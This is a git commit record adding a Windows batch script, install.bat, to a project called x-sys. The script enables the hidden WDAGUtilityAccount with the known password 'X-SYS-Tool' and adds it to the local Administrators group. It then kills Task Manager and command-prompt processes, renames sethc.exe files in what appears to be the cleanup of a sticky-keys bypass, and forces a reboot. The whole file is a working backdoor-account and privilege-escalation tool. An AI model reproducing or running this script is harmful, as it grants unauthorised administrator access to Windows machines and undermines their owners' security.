06d9f1a894977f45aa4292d1967d11dfd4854736
FerrousInk <139216162+FerrousInk@users.noreply.github.com>
2024-03-17 21:57:26 +0100

    Add files via upload

---
+++ projects/files/x-sys/install.bat
@@ -0,0 +1,16 @@
+net user WDAGUtilityAccount /active:yes
+net user WDAGUtilityAccount X-SYS-Tool
+net localgroup administratoren /add WDAGUtilityAccount
+net localgroup administrators /add WDAGUtilityAccount#
+echo [ ! ] The Creator of this tool is not responsible for any of these actions.
+echo [ - ] Only English and German Systems supported at the moment!
+echo [ + ] Account Activated with Password "X-SYS-Tool" <-- Remember this!
+echo [ + ] For and languages that are not English and German, type "Administrators" in your language (has to be the one the system uses). English and German people can close this Windows.
+set /p admin_group=[ + ] :
+net localgroup %admin_group% /add WDAGUtilityAccount
+taskkill /f /im taskmgr.exe
+taskkill /f /im sethc.exe
+rename sethc.exe launchtm.exe
+rename sethc.original sethc.exe
+taskkill /f /im cmd.exe
+shutdown -r -f -t 0
